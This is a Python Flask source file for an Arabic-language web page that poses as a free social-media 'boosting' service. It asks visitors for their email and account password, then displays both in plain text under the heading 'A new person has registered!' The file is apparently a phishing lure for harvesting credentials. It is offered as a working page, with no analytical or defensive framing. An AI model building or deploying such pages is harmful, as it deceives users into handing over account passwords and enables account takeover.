from flask import Flask, render_template_string, request

app = Flask(__name__)

# HTML واجهة الموقع
html = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>موقع الرشق المجاني</title>
    <style>
        body { background-color: #f0f0f0; font-family: Arial; text-align: center; padding: 50px; }
        .container { background: white; padding: 20px; border-radius: 10px; display: inline-block; }
        input { margin: 10px; padding: 10px; width: 80%; border-radius: 5px; border: 1px solid #ccc; }
        button { padding: 10px 20px; border: none; background-color: #4CAF50; color: white; border-radius: 5px; cursor: pointer; }
        .message { margin-top: 20px; padding: 10px; background: #e7ffe7; border: 1px solid #b2d8b2; border-radius: 5px; }
    </style>
</head>
<body>

<div class="container">
    <h2>اهلا بك في موقع الرشق المجاني</h2>
    <form method="POST">
        <input type="email" name="email" placeholder="البريد الإلكتروني" required><br>
        <input type="password" name="password" placeholder="كلمة المرور" required><br>
        <button type="submit">تسجيل الدخول</button>
    </form>

    {% if email and password %}
    <div class="message">
        <h3>تم تسجيل شخص جديد!</h3>
        <p><strong>الإيميل:</strong> {{ email }}</p>
        <p><strong>كلمة السر:</strong> {{ password }}</p>
    </div>
    {% endif %}
</div>

</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    email = None
    password = None
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
    return render_template_string(html, email=email, password=password)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
